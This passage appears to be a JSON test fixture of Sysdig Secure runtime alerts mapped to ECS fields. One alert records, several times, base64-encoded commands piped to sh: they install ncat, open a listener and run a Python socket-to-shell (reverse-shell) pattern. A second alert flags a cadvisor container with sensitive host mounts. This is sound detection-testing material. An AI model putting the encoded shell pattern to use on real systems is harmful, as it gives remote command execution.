                    "id": "012345678912"
                },
                "project": {
                    "id": "012345678912"
                },
                "provider": "gcp",
                "region": "us-central1"
            },
            "container": {
                "image": {
                    "hash": {
                        "all": [
                            "sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a"
                        ]
                    },
                    "name": "docker.io/library/python"
                },
                "name": "shell-scripting"
            },
            "ecs": {
                "version": "8.11.0"
            },
            "event": {
                "category": [
                    "process"
                ],
                "id": "1a334cdef0060123456789abcdef64a9",
                "kind": "event",
                "original": "{\"category\":\"runtime\",\"content\":{\"fields\":{\"container.image.repository\":\"docker.io/library/python\",\"container.name\":\"shell-scripting\",\"evt.res\":\"SUCCESS\",\"evt.type\":\"execve\",\"group.gid\":\"0\",\"group.name\":\"root\",\"proc.args\":\"\",\"proc.cmdline\":\"sh\",\"proc.cwd\":\"/\",\"proc.exepath\":\"/usr/bin/dash\",\"proc.hash.sha256\":\"f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6\",\"proc.name\":\"sh\",\"proc.pcmdline\":\"bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh\",\"proc.pid\":\"1372469\",\"proc.pid.ts\":\"1743822001115100312\",\"proc.pname\":\"bash\",\"proc.ppid\":\"1372453\",\"proc.ppid.ts\":\"1743822000952432134\",\"proc.sid\":\"1\",\"user.loginname\":\"<NA>\",\"user.loginuid\":\"-1\",\"user.name\":\"root\",\"user.uid\":\"0\"},\"origin\":\"Secure UI\",\"output\":\"Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=runc ggparent=containerd-shim gggparent=systemd image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=1372469 proc.cwd=/ proc.ppid=1372453 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1743822001115100312 proc.ppid.ts=1743822000952432134 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)\",\"policyId\":10569534,\"ruleName\":\"My test rule custom\",\"ruleSubType\":0,\"ruleTags\":[\"My-tag-custom-1-hello-world\",\"MITTRE-WHATEVER\"],\"ruleType\":6,\"type\":\"workloadRuntimeDetection\"},\"description\":\"This is just a dumb policy to test custom policies\",\"engine\":\"falco\",\"id\":\"1a334cdef0060123456789abcdef64a9\",\"labels\":{\"cloudProvider.account.id\":\"012345678912\",\"cloudProvider.name\":\"gcp\",\"cloudProvider.region\":\"us-central1\",\"container.image.digest\":\"sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a\",\"container.image.id\":\"ef0f72a55bd2\",\"container.image.repo\":\"docker.io/library/python\",\"container.image.tag\":\"3.9.18-slim\",\"container.label.io.kubernetes.container.name\":\"shell-scripting\",\"container.label.io.kubernetes.pod.name\":\"shell-scripting-29063700-123ab\",\"container.label.io.kubernetes.pod.namespace\":\"default\",\"container.name\":\"shell-scripting\",\"gcp.location\":\"us-central1\",\"gcp.projectId\":\"012345678912\",\"host.hostName\":\"gke-cluster-gcp-demo-san-default-pool-11234abc-abcd\",\"host.mac\":\"01:00:5e:90:10:00\",\"kubernetes.cluster.name\":\"gke-alliances-demo-6\",\"kubernetes.cronJob.name\":\"shell-scripting\",\"kubernetes.job.name\":\"shell-scripting-29063700\",\"kubernetes.namespace.name\":\"default\",\"kubernetes.node.name\":\"gke-cluster-gcp-demo-san-default-pool-12345678-abcd\",\"kubernetes.pod.name\":\"shell-scripting-12345678-123ab\",\"kubernetes.workload.name\":\"shell-scripting\",\"kubernetes.workload.type\":\"cronjob\"},\"name\":\"Manuel test policy\",\"originator\":\"policy\",\"rawEventCategory\":\"runtime\",\"rawEventOriginator\":\"linuxAgent\",\"severity\":4,\"source\":\"syscall\",\"sourceDetails\":{\"subType\":\"container\",\"type\":\"workload\"},\"timestamp\":1743822001115928600}",
                "outcome": "success",
                "provider": "syscall",
                "severity": 4,
                "type": [
                    "info"
                ]
            },
            "host": {
                "hostname": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd",
                "mac": [
                    "01-00-5E-90-10-00"
                ],
                "name": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd"
            },
            "message": "Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=runc ggparent=containerd-shim gggparent=systemd image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=1372469 proc.cwd=/ proc.ppid=1372453 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1743822001115100312 proc.ppid.ts=1743822000952432134 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)",
            "observer": {
                "product": "Sysdig Secure",
                "vendor": "Sysdig"
            },
            "orchestrator": {
                "cluster": {
                    "name": "gke-alliances-demo-6"
                },
                "namespace": "default",
                "resource": {
                    "name": "shell-scripting-12345678-123ab",
                    "parent": {
                        "type": "cronjob"
                    }
                }
            },
            "process": {
                "command_line": "sh",
                "executable": "/usr/bin/dash",
                "hash": {
                    "sha256": "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6"
                },
                "name": "sh",
                "parent": {
                    "command_line": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                    "name": "bash",
                    "pid": 1372453,
                    "start": "2025-04-05T03:00:00.952432134Z"
                },
                "pid": 1372469,
                "start": "2025-04-05T03:00:01.115100312Z",
                "working_directory": "/"
            },
            "related": {
                "hash": [
                    "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6",
                    "aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a"
                ],
                "hosts": [
                    "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd"
                ],
                "user": [
                    "root",
                    "0"
                ]
            },
            "rule": {
                "description": "This is just a dumb policy to test custom policies",
                "name": "My test rule custom",
                "ruleset": "Manuel test policy"
            },
            "sysdig": {
                "event": {
                    "category": "runtime",
                    "content": {
                        "fields": {
                            "container": {
                                "image": {
                                    "repository": "docker.io/library/python"
                                },
                                "name": "shell-scripting"
                            },
                            "evt": {
                                "res": "SUCCESS",
                                "type": "execve"
                            },
                            "group": {
                                "gid": "0",
                                "name": "root"
                            },
                            "proc": {
                                "cmdline": "sh",
                                "cwd": "/",
                                "exepath": "/usr/bin/dash",
                                "hash": {
                                    "sha256": "f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6"
                                },
                                "name": "sh",
                                "pcmdline": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                                "pid": 1372469,
                                "pid_ts": "2025-04-05T03:00:01.115100312Z",
                                "pname": "bash",
                                "ppid": 1372453,
                                "ppid_ts": "2025-04-05T03:00:00.952432134Z",
                                "sid": "1"
                            },
                            "user": {
                                "name": "root",
                                "uid": "0"
                            }
                        },
                        "origin": "Secure UI",
                        "output": "Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=runc ggparent=containerd-shim gggparent=systemd image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=1372469 proc.cwd=/ proc.ppid=1372453 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1743822001115100312 proc.ppid.ts=1743822000952432134 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)",
                        "policy_id": "10569534",
                        "rule_name": "My test rule custom",
                        "rule_sub_type": 0,
                        "rule_tags": [
                            "My-tag-custom-1-hello-world",
                            "MITTRE-WHATEVER"
                        ],
                        "rule_type": 6,
                        "type": "workloadRuntimeDetection"
                    },
                    "description": "This is just a dumb policy to test custom policies",
                    "engine": "falco",
                    "id": "1a334cdef0060123456789abcdef64a9",
                    "labels": {
                        "cloud_provider": {
                            "account": {
                                "id": "012345678912"
                            },
                            "name": "gcp",
                            "region": "us-central1"
                        },
                        "container": {
                            "image": {
                                "digest": "sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a",
                                "id": "ef0f72a55bd2",
                                "repo": "docker.io/library/python",
                                "tag": "3.9.18-slim"
                            },
                            "label": {
                                "io": {
                                    "kubernetes": {
                                        "container": {
                                            "name": "shell-scripting"
                                        },
                                        "pod": {
                                            "name": "shell-scripting-29063700-123ab",
                                            "namespace": "default"
                                        }
                                    }
                                }
                            },
                            "name": "shell-scripting"
                        },
                        "gcp": {
                            "location": "us-central1",
                            "project_id": "012345678912"
                        },
                        "host": {
                            "host_name": "gke-cluster-gcp-demo-san-default-pool-11234abc-abcd",
                            "mac": "01-00-5E-90-10-00"
                        },
                        "kubernetes": {
                            "cluster": {
                                "name": "gke-alliances-demo-6"
                            },
                            "cron_job": {
                                "name": "shell-scripting"
                            },
                            "job": {
                                "name": "shell-scripting-29063700"
                            },
                            "namespace": {
                                "name": "default"
                            },
                            "node": {
                                "name": "gke-cluster-gcp-demo-san-default-pool-12345678-abcd"
                            },
                            "pod": {
                                "name": "shell-scripting-12345678-123ab"
                            },
                            "workload": {
                                "name": "shell-scripting",
                                "type": "cronjob"
                            }
                        }
                    },
                    "name": "Manuel test policy",
                    "originator": "policy",
                    "raw_event_category": "runtime",
                    "raw_event_originator": "linuxAgent",
                    "severity": 4,
                    "severity_value": "Medium",
                    "source": "syscall",
                    "source_details": {
                        "sub_type": "container",
                        "type": "workload"
                    },
                    "timestamp": "2025-04-05T03:00:01.1159286Z"
                }
            },
            "tags": [
                "preserve_duplicate_custom_fields"
            ],
            "user": {
                "group": {
                    "id": "0",
                    "name": "root"
                },
                "id": "0",
                "name": "root"
            }
        },
        {
            "@timestamp": "2025-04-15T07:13:45.52835Z",
            "container": {
                "id": "382abcdefd0a",
                "image": {
                    "hash": {
                        "all": [
                            "sha256:9360d7421c5e9b646ea13e5ced3f8e6da80017b0144733a04b7401dd8c01a5cb"
                        ]
                    },
                    "name": "gcr.io/cadvisor/cadvisor",
                    "tag": [
                        "v0.45.0"
                    ]
                },
                "name": "cadvisor"
            },
            "ecs": {
                "version": "8.11.0"
            },
            "event": {
                "category": [
                    "process"
                ],
                "id": "1836ac8550123456789abcdefe5d827f",
                "kind": "event",
                "original": "{\"actions\":[{\"afterEventNs\":30000000000,\"beforeEventNs\":15000000000,\"errMsg\":\"maximum number of outstanding captures (1) reached\",\"isSuccessful\":false,\"token\":\"7d30b372-3dd9-1234-5678-403612345678\",\"type\":\"capture\"}],\"category\":\"runtime\",\"content\":{\"fields\":{\"container.id\":\"382abcdefd0a\",\"container.image.repository\":\"gcr.io/cadvisor/cadvisor\",\"container.image.tag\":\"v0.45.0\",\"container.mounts\":\"/:/rootfs::false:private,/var/run:/var/run::false:private,/sys:/sys::false:private,/var/lib/docker:/var/lib/docker::false:private,/dev/disk:/dev/disk::false:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/etc-hosts:/etc/hosts::true:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/containers/cadvisor/e5f5ac18:/dev/termination-log::true:private\",\"container.name\":\"cadvisor\",\"evt.res\":\"SUCCESS\",\"evt.type\":\"execve\",\"group.gid\":\"0\",\"group.name\":\"root\",\"proc.cmdline\":\"cadvisor -logtostderr --enable_metrics=cpu,diskIO,memory,network,oom_event --docker_only\",\"proc.cwd\":\"/\",\"proc.exepath\":\"/usr/bin/cadvisor\",\"proc.name\":\"cadvisor\",\"proc.pcmdline\":\"runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/init.pid 382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a\",\"proc.pid\":\"741051\",\"proc.pname\":\"runc\",\"proc.ppid\":\"741043\",\"proc.sid\":\"1\",\"user.loginname\":\"<NA>\",\"user.loginuid\":\"-1\",\"user.name\":\"root\",\"user.uid\":\"0\"},\"origin\":\"Sysdig\",\"output\":\"Container cadvisor having image gcr.io/cadvisor/cadvisor with sensitive mount started by user root  and parent runc (proc.name=cadvisor image=gcr.io/cadvisor/cadvisor:v0.45.0 proc.exepath=/usr/bin/cadvisor proc.pname=runc gparent=containerd-shim ggparent=systemd gggparent=<NA> mounts=/:/rootfs::false:private,/var/run:/var/run::false:private,/sys:/sys::false:private,/var/lib/docker:/var/lib/docker::false:private,/dev/disk:/dev/disk::false:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/etc-hosts:/etc/hosts::true:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/containers/cadvisor/e5f5ac18:/dev/termination-log::true:private evt.type=execve evt.res=SUCCESS proc.pid=741051 proc.cwd=/ proc.ppid=741043 proc.pcmdline=runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/init.pid 382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a proc.sid=1 user.loginuid=-1 user.uid=0 user.loginname=<NA> group.gid=0 group.name=root container.id=382e35271d0a container.name=cadvisor)\",\"policyId\":10011701,\"ruleName\":\"Launch Sensitive Mount Container\",\"ruleSubType\":0,\"ruleTags\":[\"container\",\"container_best_practices\",\"container_immutability\",\"SOC2\",\"SOC2_CC6.1\",\"NIST\",\"NIST_800-190\",\"NIST_800-190_3.4.3\",\"NIST_800-190_3.5.5\",\"NIST_800-53\",\"NIST_800-53_AC-6(9)\",\"NIST_800-53_AC-6(10)\",\"NIST_800-53_AU-6(8)\",\"ISO\",\"ISO_27001\",\"ISO_27001_A.9.2.3\",\"HIPAA\",\"HIPAA_164.308(a)\",\"HIPAA_164.312(a)\",\"HIPAA_164.312(b)\",\"HITRUST\",\"HITRUST_CSF\",\"HITRUST_CSF_01.c\",\"HITRUST_CSF_09.aa\",\"GDPR\",\"GDPR_32.1\",\"GDPR_32.2\",\"MITRE\",\"MITRE_T1609_container_administration_command\",\"MITRE_T1611_escape_to_host\",\"MITRE_TA0002_execution\",\"MITRE_TA0004_privilege_escalation\",\"MITRE_TA0008_lateral_movement\",\"MITRE_T1610_deploy_container\",\"MITRE_TA0005_defense_evasion\",\"MITRE_T1055.009_process_injection_proc_memory\",\"MITRE_T1543_create_or_modify_system_process\",\"CIS\",\"oss\"],\"ruleType\":6,\"type\":\"workloadRuntimeDetection\"},\"description\":\"This Notable Events policy contains rules which may indicate undesired behavior including security threats. The rules are more generalized than Threat Detection policies and may result in more noise. Tuning will likely be required for the events generated from this policy.\",\"engine\":\"falco\",\"id\":\"1836ac8550123456789abcdefe5d827f\",\"labels\":{\"container.image.digest\":\"sha256:9360d7421c5e9b646ea13e5ced3f8e6da80017b0144733a04b7401dd8c01a5cb\",\"container.image.id\":\"3f3e5f568a6d\",\"container.image.repo\":\"gcr.io/cadvisor/cadvisor\",\"container.image.tag\":\"v0.45.0\",\"container.label.io.kubernetes.container.name\":\"cadvisor\",\"container.label.io.kubernetes.pod.name\":\"wave-autoscale-agent-abcde\",\"container.label.io.kubernetes.pod.namespace\":\"wave-autoscale\",\"container.name\":\"cadvisor\",\"host.hostName\":\"hybrid-node\",\"host.mac\":\"01:00:5e:90:10:02\",\"kubernetes.cluster.name\":\"myclusterName\",\"kubernetes.namespace.name\":\"wave-autoscale\",\"kubernetes.node.name\":\"node04\",\"kubernetes.pod.name\":\"wave-autoscale-agent-abcde\"},\"name\":\"Sysdig Runtime Notable Events\",\"originator\":\"policy\",\"rawEventCategory\":\"runtime\",\"rawEventOriginator\":\"linuxAgent\",\"severity\":5,\"source\":\"syscall\",\"sourceDetails\":{\"subType\":\"container\",\"type\":\"workload\"},\"timestamp\":1744701225528350000}",
                "outcome": "success",
                "provider": "syscall",
                "severity": 5,
                "type": [
                    "info"
                ]
            },
            "host": {
                "hostname": "hybrid-node",
                "mac": [
                    "01-00-5E-90-10-02"
                ],
                "name": "hybrid-node"
            },
            "message": "Container cadvisor having image gcr.io/cadvisor/cadvisor with sensitive mount started by user root  and parent runc (proc.name=cadvisor image=gcr.io/cadvisor/cadvisor:v0.45.0 proc.exepath=/usr/bin/cadvisor proc.pname=runc gparent=containerd-shim ggparent=systemd gggparent=<NA> mounts=/:/rootfs::false:private,/var/run:/var/run::false:private,/sys:/sys::false:private,/var/lib/docker:/var/lib/docker::false:private,/dev/disk:/dev/disk::false:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/etc-hosts:/etc/hosts::true:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/containers/cadvisor/e5f5ac18:/dev/termination-log::true:private evt.type=execve evt.res=SUCCESS proc.pid=741051 proc.cwd=/ proc.ppid=741043 proc.pcmdline=runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/init.pid 382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a proc.sid=1 user.loginuid=-1 user.uid=0 user.loginname=<NA> group.gid=0 group.name=root container.id=382e35271d0a container.name=cadvisor)",
            "observer": {
                "product": "Sysdig Secure",
                "vendor": "Sysdig"
            },
            "orchestrator": {
                "cluster": {
                    "name": "myclusterName"
                },
                "namespace": "wave-autoscale",
                "resource": {
                    "name": "wave-autoscale-agent-abcde"
                }
            },
            "process": {
                "command_line": "cadvisor -logtostderr --enable_metrics=cpu,diskIO,memory,network,oom_event --docker_only",
                "executable": "/usr/bin/cadvisor",
                "name": "cadvisor",
                "parent": {
                    "command_line": "runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/init.pid 382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a",
                    "name": "runc",
                    "pid": 741043
                },
                "pid": 741051,
                "working_directory": "/"
            },
            "related": {
                "hash": [
                    "9360d7421c5e9b646ea13e5ced3f8e6da80017b0144733a04b7401dd8c01a5cb"
                ],
                "hosts": [
                    "hybrid-node"
                ],
                "user": [
                    "root",
                    "0"
                ]
            },
            "rule": {
                "description": "This Notable Events policy contains rules which may indicate undesired behavior including security threats. The rules are more generalized than Threat Detection policies and may result in more noise. Tuning will likely be required for the events generated from this policy.",
                "name": "Launch Sensitive Mount Container",
                "ruleset": "Sysdig Runtime Notable Events"
            },
            "sysdig": {
                "event": {
                    "actions": [
                        {
                            "after_event_ns": 30000000000,
                            "before_event_ns": 15000000000,
                            "err_msg": "maximum number of outstanding captures (1) reached",
                            "is_successful": false,
                            "token": "7d30b372-3dd9-1234-5678-403612345678",
                            "type": "capture"
                        }
                    ],
                    "category": "runtime",
                    "content": {
                        "fields": {
                            "container": {
                                "id": "382abcdefd0a",
                                "image": {
                                    "repository": "gcr.io/cadvisor/cadvisor",
                                    "tag": "v0.45.0"
                                },
                                "mounts": "/:/rootfs::false:private,/var/run:/var/run::false:private,/sys:/sys::false:private,/var/lib/docker:/var/lib/docker::false:private,/dev/disk:/dev/disk::false:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/etc-hosts:/etc/hosts::true:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/containers/cadvisor/e5f5ac18:/dev/termination-log::true:private",
                                "name": "cadvisor"
                            },
                            "evt": {
                                "res": "SUCCESS",
                                "type": "execve"
                            },
                            "group": {
                                "gid": "0",
                                "name": "root"
                            },
                            "proc": {
                                "cmdline": "cadvisor -logtostderr --enable_metrics=cpu,diskIO,memory,network,oom_event --docker_only",
                                "cwd": "/",
                                "exepath": "/usr/bin/cadvisor",
                                "name": "cadvisor",
                                "pcmdline": "runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/init.pid 382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a",
                                "pid": 741051,
                                "pname": "runc",
                                "ppid": 741043,
                                "sid": "1"
                            },
                            "user": {
                                "name": "root",
                                "uid": "0"
                            }
                        },
                        "origin": "Sysdig",
                        "output": "Container cadvisor having image gcr.io/cadvisor/cadvisor with sensitive mount started by user root  and parent runc (proc.name=cadvisor image=gcr.io/cadvisor/cadvisor:v0.45.0 proc.exepath=/usr/bin/cadvisor proc.pname=runc gparent=containerd-shim ggparent=systemd gggparent=<NA> mounts=/:/rootfs::false:private,/var/run:/var/run::false:private,/sys:/sys::false:private,/var/lib/docker:/var/lib/docker::false:private,/dev/disk:/dev/disk::false:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/etc-hosts:/etc/hosts::true:private,/var/lib/kubelet/pods/e08484f0-c944-4b62-bdb3-9341e74ef7b5/containers/cadvisor/e5f5ac18:/dev/termination-log::true:private evt.type=execve evt.res=SUCCESS proc.pid=741051 proc.cwd=/ proc.ppid=741043 proc.pcmdline=runc --root /run/containerd/runc/k8s.io --log /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/log.json --log-format json --systemd-cgroup create --bundle /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a --pid-file /run/containerd/io.containerd.runtime.v2.task/k8s.io/382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a/init.pid 382e35271d0a388267e9ed7ab262e0735ebfbaa1fd5dc09a3645d7b22e62580a proc.sid=1 user.loginuid=-1 user.uid=0 user.loginname=<NA> group.gid=0 group.name=root container.id=382e35271d0a container.name=cadvisor)",
                        "policy_id": "10011701",
                        "rule_name": "Launch Sensitive Mount Container",
                        "rule_sub_type": 0,
                        "rule_tags": [
                            "container",
                            "container_best_practices",
                            "container_immutability",
                            "SOC2",
                            "SOC2_CC6.1",
                            "NIST",
                            "NIST_800-190",
                            "NIST_800-190_3.4.3",
                            "NIST_800-190_3.5.5",
                            "NIST_800-53",
                            "NIST_800-53_AC-6(9)",
                            "NIST_800-53_AC-6(10)",
                            "NIST_800-53_AU-6(8)",
                            "ISO",
                            "ISO_27001",
                            "ISO_27001_A.9.2.3",
                            "HIPAA",
                            "HIPAA_164.308(a)",
                            "HIPAA_164.312(a)",
                            "HIPAA_164.312(b)",
                            "HITRUST",
                            "HITRUST_CSF",
                            "HITRUST_CSF_01.c",
                            "HITRUST_CSF_09.aa",
                            "GDPR",
                            "GDPR_32.1",
                            "GDPR_32.2",
                            "MITRE",
                            "MITRE_T1609_container_administration_command",
                            "MITRE_T1611_escape_to_host",
                            "MITRE_TA0002_execution",
                            "MITRE_TA0004_privilege_escalation",
                            "MITRE_TA0008_lateral_movement",
                            "MITRE_T1610_deploy_container",
                            "MITRE_TA0005_defense_evasion",
                            "MITRE_T1055.009_process_injection_proc_memory",
                            "MITRE_T1543_create_or_modify_system_process",
                            "CIS",
                            "oss"
                        ],
                        "rule_type": 6,
                        "type": "workloadRuntimeDetection"
                    },
                    "description": "This Notable Events policy contains rules which may indicate undesired behavior including security threats. The rules are more generalized than Threat Detection policies and may result in more noise. Tuning will likely be required for the events generated from this policy.",
                    "engine": "falco",
                    "id": "1836ac8550123456789abcdefe5d827f",
                    "labels": {
                        "container": {
                            "image": {
